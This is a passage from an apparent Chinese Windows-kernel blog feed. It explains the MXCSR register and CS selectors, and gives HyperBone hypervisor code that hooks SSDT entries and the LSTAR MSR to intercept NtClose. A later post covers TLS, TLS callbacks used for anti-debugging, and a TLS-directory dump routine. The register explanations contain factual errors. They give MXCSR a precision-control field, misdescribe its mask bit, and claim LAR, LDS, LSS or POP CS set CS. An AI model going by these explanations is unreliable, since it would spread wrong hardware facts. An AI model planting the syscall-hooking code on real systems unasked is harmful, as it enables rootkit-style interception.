class="line">┌─────────┬───────┬───────┬─────┐</span><br><span class="line">│   RFU   │  RC   │  PC   │  PM │</span><br><span class="line">└─────────┴───────┴───────┴─────┘</span><br></pre></td></tr></table></figure><p>各个标志位的含义如下：</p><ul><li>PM (Precision Mask)：精度掩码位，用于控制浮点运算结果的舍入精度。</li><li>PC (Precision Control)：精度控制位，用于设置浮点运算结果的默认舍入精度模式。</li><li>RC (Rounding Control)：舍入控制位，用于设置浮点运算结果的舍入方式。</li><li>RFU (Reserved for Future Use)：保留字段，暂未使用。</li></ul><p>通过对MXCSR寄存器的设置，可以控制浮点运算的舍入方式、精度和异常处理等行为。例如，可以设置精度掩码位PM来屏蔽或允许特定类型的浮点异常，或者通过设置精度控制位PC来指定浮点运算结果的默认舍入精度模式。</p><p>MXCSR寄存器可以通过指令进行读取和修改，例如LDMXCSR和STMXCSR指令。它对于进行精确的浮点计算和处理浮点异常非常重要，能够提供更好的浮点运算控制和性能优化。</p><h4 id="CS选择子"><a href="#CS选择子" class="headerlink" title="CS选择子"></a>CS选择子</h4><p>在x86架构中，CS（Code Segment）是一种代码段寄存器，主要用于存储当前程序正在执行的代码所在的段的信息。CS选择子则是对CS寄存器进行访问的一种方式。</p><p>CS选择子是一个16位的数据结构，包含了以下信息：</p><ul><li>段选择子：用于指向代码段的段描述符，其中包含了代码段的起始地址、大小、特权级等信息。</li><li>请求特权级（RPL）：用于指定代码段的访问权限，取值为0~3。</li></ul><p>CS选择子可以通过一些指令读取或修改，例如LAR指令、LDS指令、LSS指令等。在进行指令跳转时，CPU会使用CS选择子来确定下一条指令的地址。因此，CS选择子的正确设置非常重要，对程序的执行具有至关重要的影响。</p><p>需要注意的是，CS选择子只是用于访问CS寄存器的一种方式，它并不是CS寄存器本身。CS寄存器还可以通过其他方式进行访问，例如POP CS指令、IRET指令等。</p><h2 id="系统调用钩子"><a href="#系统调用钩子" class="headerlink" title="系统调用钩子"></a>系统调用钩子</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/// &lt;summary&gt;</span></span><br><span class="line"><span class="comment">/// Hook specific SSDT entry</span></span><br><span class="line"><span class="comment">/// &lt;/summary&gt;</span></span><br><span class="line"><span class="comment">/// &lt;param name=&quot;index&quot;&gt;SSDT index&lt;/param&gt;</span></span><br><span class="line"><span class="comment">/// &lt;param name=&quot;hookPtr&quot;&gt;Hook address&lt;/param&gt;</span></span><br><span class="line"><span class="comment">/// &lt;param name=&quot;argCount&quot;&gt;Number of function arguments&lt;/param&gt;</span></span><br><span class="line"><span class="comment">/// &lt;returns&gt;Status code&lt;/returns&gt;</span></span><br><span class="line"><span class="function">NTSTATUS <span class="title">SHHookSyscall</span><span class="params">( IN ULONG index, IN PVOID hookPtr, IN CHAR argCount )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    NTSTATUS status = STATUS_SUCCESS;</span><br><span class="line">    <span class="keyword">if</span> (index &gt; MAX_SYSCALL_INDEX || hookPtr == <span class="literal">NULL</span>)<span class="comment">// 超过最大系统调用索引或者hook地址为空</span></span><br><span class="line">        <span class="keyword">return</span> STATUS_INVALID_PARAMETER;</span><br><span class="line"></span><br><span class="line">    KIRQL irql = <span class="built_in">KeGetCurrentIrql</span>();<span class="comment">// 获取当前IRQL（中断请求级别）</span></span><br><span class="line">    <span class="keyword">if</span> (irql &lt; DISPATCH_LEVEL)</span><br><span class="line">        <span class="comment">// 如果小于调度级别，提升到调度级别</span></span><br><span class="line">        irql = <span class="built_in">KeRaiseIrqlToDpcLevel</span>();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 保存原始hook地址和参数个数</span></span><br><span class="line">    <span class="comment">// 保证多线程环境下对HookTable、ArgTble、HookEnabled的操作的原子性</span></span><br><span class="line">    <span class="built_in">InterlockedExchange64</span>( (PLONG64)&amp;HookTable[index], (LONG64)hookPtr );</span><br><span class="line">    <span class="built_in">InterlockedExchange8</span>( &amp;ArgTble[index], argCount );</span><br><span class="line">    <span class="built_in">InterlockedExchange8</span>( &amp;HookEnabled[index], TRUE );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 恢复权限</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">KeGetCurrentIrql</span>() &gt; irql)</span><br><span class="line">        <span class="built_in">KeLowerIrql</span>( irql );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> status;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="hkNtClose"><a href="#hkNtClose" class="headerlink" title="hkNtClose"></a>hkNtClose</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">NTSTATUS <span class="title">hkNtClose</span><span class="params">( HANDLE handle )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    calls1++;<span class="comment">// 记录hkNtClose函数被调用的次数</span></span><br><span class="line">    <span class="keyword">return</span> ((pfnNtClose)g_NtClose)(handle);<span class="comment">// 使用函数指针类型pfnNtClose调用了全局变量g_NtClose所指向的原始NtClose系统调用函数，并将handle作为参数传递给原始函数</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="hkNtClose2"><a href="#hkNtClose2" class="headerlink" title="hkNtClose2"></a>hkNtClose2</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">NTSTATUS <span class="title">hkNtClose2</span><span class="params">( HANDLE handle )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    PPAGE_HOOK_ENTRY pEntry = <span class="built_in">PHGetHookEntry</span>( g_NtClose );<span class="comment">// 获取全局系统调用函数的hook entry</span></span><br><span class="line">    <span class="keyword">if</span> (pEntry)</span><br><span class="line">    &#123;</span><br><span class="line">        calls2++;<span class="comment">// 记录hkNtClose2函数被调用的次数</span></span><br><span class="line">        <span class="comment">// 使用函数指针类型pfnNtClose调用了hook entry的OriginalData字段所指向的原始NtClose系统调用函数，并将handle作为参数传递给原始函数</span></span><br><span class="line">        <span class="keyword">return</span> ((pfnNtClose)pEntry-&gt;OriginalData)(handle);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="驱动卸载"><a href="#驱动卸载" class="headerlink" title="驱动卸载"></a>驱动卸载</h1><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">VOID <span class="title">HBUnload</span><span class="params">( IN PDRIVER_OBJECT DriverObject )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">UNREFERENCED_PARAMETER</span>( DriverObject );</span><br><span class="line"></span><br><span class="line">    <span class="built_in">TestPrintResults</span>();<span class="comment">// 打印测试结果</span></span><br><span class="line">    <span class="built_in">TestStop</span>();<span class="comment">// 停止测试</span></span><br><span class="line"></span><br><span class="line">    NTSTATUS status = <span class="built_in">StopHV</span>();<span class="comment">// 停止虚拟化</span></span><br><span class="line">    <span class="built_in">DPRINT</span>( <span class="string">&quot;HyperBone: CPU %d: %s: Unload %s\n&quot;</span>, CPU_IDX, __FUNCTION__, <span class="built_in">NT_SUCCESS</span>( status ) ? <span class="string">&quot;SUCCEDED&quot;</span> : <span class="string">&quot;FAILED&quot;</span> );</span><br><span class="line">    <span class="built_in">FreeGlobalData</span>( g_Data );<span class="comment">// 释放全局变量</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="打印测试结果"><a href="#打印测试结果" class="headerlink" title="打印测试结果"></a>打印测试结果</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">VOID <span class="title">TestPrintResults</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">DPRINT</span>( <span class="string">&quot;HyperBone: CPU %d: %s: SyscallHook Calls made %d\n&quot;</span>, CPU_IDX, __FUNCTION__, calls1 );</span><br><span class="line">    <span class="built_in">DPRINT</span>( <span class="string">&quot;HyperBone: CPU %d: %s: PageHook Calls made %d\n&quot;</span>, CPU_IDX, __FUNCTION__, calls2 );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="停止测试"><a href="#停止测试" class="headerlink" title="停止测试"></a>停止测试</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">VOID <span class="title">TestStop</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">PHRestore</span>( g_NtClose );<span class="comment">// 恢复系统调用钩子</span></span><br><span class="line">    <span class="built_in">SHRestoreSyscall</span>( <span class="built_in">SSDTIndex</span>( &amp;ZwClose ) );<span class="comment">// 恢复原始SSDT表入口</span></span><br><span class="line">    <span class="built_in">SHDestroyHook</span>();<span class="comment">// 释放LSTAR钩子</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="恢复SSDT表"><a href="#恢复SSDT表" class="headerlink" title="恢复SSDT表"></a>恢复SSDT表</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/// &lt;summary&gt;</span></span><br><span class="line"><span class="comment">/// Restore original SSDT entry</span></span><br><span class="line"><span class="comment">/// &lt;/summary&gt;</span></span><br><span class="line"><span class="comment">/// &lt;param name=&quot;index&quot;&gt;SSDT index&lt;/param&gt;</span></span><br><span class="line"><span class="comment">/// &lt;returns&gt;Status code&lt;/returns&gt;</span></span><br><span class="line"><span class="function">NTSTATUS <span class="title">SHRestoreSyscall</span><span class="params">( IN ULONG index )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 检查最大系统调用索引</span></span><br><span class="line">    <span class="keyword">if</span> (index &gt; MAX_SYSCALL_INDEX)</span><br><span class="line">        <span class="keyword">return</span> STATUS_INVALID_PARAMETER;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检查权限</span></span><br><span class="line">    KIRQL irql = <span class="built_in">KeGetCurrentIrql</span>();</span><br><span class="line">    <span class="keyword">if</span> (irql &lt; DISPATCH_LEVEL)</span><br><span class="line">        irql = <span class="built_in">KeRaiseIrqlToDpcLevel</span>();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 恢复原始系统调用表</span></span><br><span class="line">    <span class="built_in">InterlockedExchange8</span>( &amp;HookEnabled[index], <span class="number">0</span> );</span><br><span class="line">    <span class="built_in">InterlockedExchange8</span>( &amp;ArgTble[index], <span class="number">0</span> );</span><br><span class="line">    <span class="built_in">InterlockedExchange64</span>( (PLONG64)&amp;HookTable[index], <span class="number">0</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 还原权限</span></span><br><span class="line">    <span class="keyword">if</span>( <span class="built_in">KeGetCurrentIrql</span>() &gt; irql )</span><br><span class="line">        <span class="built_in">KeLowerIrql</span>( irql );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="释放LSTAR钩子"><a href="#释放LSTAR钩子" class="headerlink" title="释放LSTAR钩子"></a>释放LSTAR钩子</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/// &lt;summary&gt;</span></span><br><span class="line"><span class="comment">/// Unhook LSTAR</span></span><br><span class="line"><span class="comment">/// &lt;/summary&gt;</span></span><br><span class="line"><span class="comment">/// &lt;returns&gt;Status code&lt;/returns&gt;</span></span><br><span class="line"><span class="function">NTSTATUS <span class="title">SHDestroyHook</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    NTSTATUS status = STATUS_SUCCESS;</span><br><span class="line">    <span class="keyword">if</span> (KiSystemCall64Ptr != <span class="number">0</span>)</span><br><span class="line">        <span class="comment">// 有hook，DPC回调恢复原始LSTAR地址</span></span><br><span class="line">        <span class="built_in">KeGenericCallDpc</span>( SHpHookCallbackDPC, <span class="literal">NULL</span> );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">NT_SUCCESS</span>( status ))</span><br><span class="line">        <span class="comment">// 取消钩子</span></span><br><span class="line">        KiSystemCall64Ptr = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> status;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></center></center>]]></content>
      
      
      <categories>
          
          <category> Windows Kernel </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>TLS</title>
      <link href="/2024/02/04/TLS/"/>
      <url>/2024/02/04/TLS/</url>
      
        <content type="html"><![CDATA[<h1 id="TLS"><a href="#TLS" class="headerlink" title="TLS"></a>TLS</h1><p>线程局部存储，TLS</p><p><img src="/.io//image-20230214145111183.png" alt="image-20230214145111183"></p><p>如何使用TLS</p><p>有静态方法和动态方法</p><p><img src="/.io//image-20230215013708036.png" alt="image-20230215013708036"></p><p>静态方法 把全局变量数据类型前添加 __declspec(thread) 关键字，同一变量在不同的线程中各自使用自己的那一份，不同的线程间不会互相影响</p><p>使用这种方法，生成的PE文件在节头中会有.tls头</p><p>动态方法 存放索引 使用一个普通的全局变量，在创建线程前创建一个独立的索引 __ v2&#x3D;TlsAlloc()，根据索引设置数组的值 TlsSetValue( __ v2, 0) ,使用时使用a &#x3D; TlsGetValue(__ v2)获取</p><p>理论上没有.tls头出现，但是测试失败</p><h1 id="TLS回调"><a href="#TLS回调" class="headerlink" title="TLS回调"></a>TLS回调</h1><p><img src="/.io//image-20230215013255890.png" alt="image-20230215013255890"></p><p><img src="/.io//image-20230215013357895.png" alt="image-20230215013357895"></p><p>调用约定为NTAPI，即_stdcall </p><p>只要有线程启动或销毁会自动调用线程回调，比EP进程初始化还要早（比主函数启动还早），许多逆向分析人员把这个特性用于反调试</p><h1 id="TLS目录"><a href="#TLS目录" class="headerlink" title="TLS目录"></a>TLS目录</h1><p>使用内存映射的方法进行分析 相当于系统自动申请内存，不用自己手动申请内存。获取内存映射句柄，使用MapViewOfFile获取虚拟地址位置  </p><p>都是文件粒度对齐</p><p>对大文件操作效率更高</p><p><img src="/.io//image-20230215014825488.png" alt="image-20230215014825488"></p><p>将内存粒度转换为文件粒度</p><p><img src="/.io//image-20230215015918708.png" alt="image-20230215015918708"></p><p><img src="/.io//image-20230215020146408.png" alt="image-20230215020146408"></p><p>DumpTlsDirectory是自己实现的</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">DumpTlsDirectory</span><span class="params">(PIMAGE_OPTIONAL_HEADER ImageOptionalHeader, </span></span></span><br><span class="line"><span class="params"><span class="function">LPBYTE ImageBase, DWORD Offset)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">BOOL IsWow64 = FALSE;</span><br><span class="line"><span class="comment">//判断PE文件的位数</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">IsOptionalHeaderPE32Plus</span>(ImageOptionalHeader, &amp;IsWow64))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (IsWow64 == FALSE)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//x64</span></span><br><span class="line">PIMAGE_TLS_DIRECTORY64 ImageTlsDirectory = (PIMAGE_TLS_DIRECTORY64)((DWORD_PTR)ImageBase + (DWORD_PTR)Offset);</span><br><span class="line">_tprintf(_T(<span class="string">&quot;StartAddressOfRawData: %p \r\nEndAddressOfRawData: %p \r\n&quot;</span>),</span><br><span class="line">ImageTlsDirectory-&gt;StartAddressOfRawData, ImageTlsDirectory-&gt;EndAddressOfRawData);</span><br><span class="line"></span><br><span class="line">_tprintf(_T(<span class="string">&quot;AddressOfIndex: %p \r\nAddressOfCallBacks:%p \r\n&quot;</span>),</span><br><span class="line">ImageTlsDirectory-&gt;AddressOfIndex, ImageTlsDirectory-&gt;AddressOfCallBacks);</span><br><span class="line"></span><br><span class="line">_tprintf(_T(<span class="string">&quot;SizeOfZeroFill: %u \r\nCharacteristics: %p \r\n&quot;</span>),</span><br><span class="line">ImageTlsDirectory-&gt;SizeOfZeroFill, ImageTlsDirectory-&gt;Characteristics);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">PIMAGE_TLS_DIRECTORY32 ImageTlsDirectory = (PIMAGE_TLS_DIRECTORY32)((DWORD_PTR)ImageBase + (DWORD_PTR)Offset);</span><br><span class="line">_tprintf(_T(<span class="string">&quot;StartAddressOfRawData: %p  \r\nEndAddressOfRawData: %p \r\n&quot;</span>),</span><br><span class="line">ImageTlsDirectory-&gt;StartAddressOfRawData, ImageTlsDirectory-&gt;EndAddressOfRawData);</span><br><span class="line"></span><br><span class="line">_tprintf(_T(<span class="string">&quot;AddressOfIndex: %p \r\nAddressOfCallBacks:%p \r\n&quot;</span>),</span><br><span class="line">ImageTlsDirectory-&gt;AddressOfIndex, ImageTlsDirectory-&gt;AddressOfCallBacks);</span><br><span class="line"></span><br><span class="line">_tprintf(_T(<span class="string">&quot;SizeOfZeroFill: %u \r\nCharacteristics: %p \r\n&quot;</span>),</span><br><span class="line">ImageTlsDirectory-&gt;SizeOfZeroFill, ImageTlsDirectory-&gt;Characteristics);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span 